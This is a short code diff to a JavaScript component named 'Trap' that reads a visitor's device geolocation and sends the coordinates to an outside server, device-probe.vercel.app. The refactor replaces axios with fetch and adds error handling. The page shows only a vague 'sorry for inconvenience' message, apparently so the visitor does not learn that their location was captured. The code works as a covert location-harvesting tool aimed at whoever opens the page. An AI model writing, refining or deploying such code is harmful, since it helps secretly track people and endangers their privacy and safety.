@@ -22,7 +22,7 @@ const Trap = () => {
     } catch (error) {
       console.error("Error getting location:", error);
       toast.error("sorry for inconvenience");
-      await main({ deviceLatitude: '', deviceLongitude: '' });
+      await main({ deviceLatitude: "", deviceLongitude: "" });
     }
   }
 
@@ -37,13 +37,22 @@ const Trap = () => {
 
   async function main(body) {
     try {
-      const response = await axios.post(
-        "https://device-probe.vercel.app/",
-        body
-      );
-      console.log(response.data);
+      const response = await fetch("https://device-probe.vercel.app/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(body),
+      });
+
+      if (!response.ok) {
+        throw new Error("Failed to send location");
+      }
+
+      const data = await response.json();
+      console.log(data);
       toast.success("sorry for inconvenience");
-      return response.data;
+      return data;
     } catch (error) {
       console.error("Error sending location:", error);
       toast.error("sorry for inconvenience");
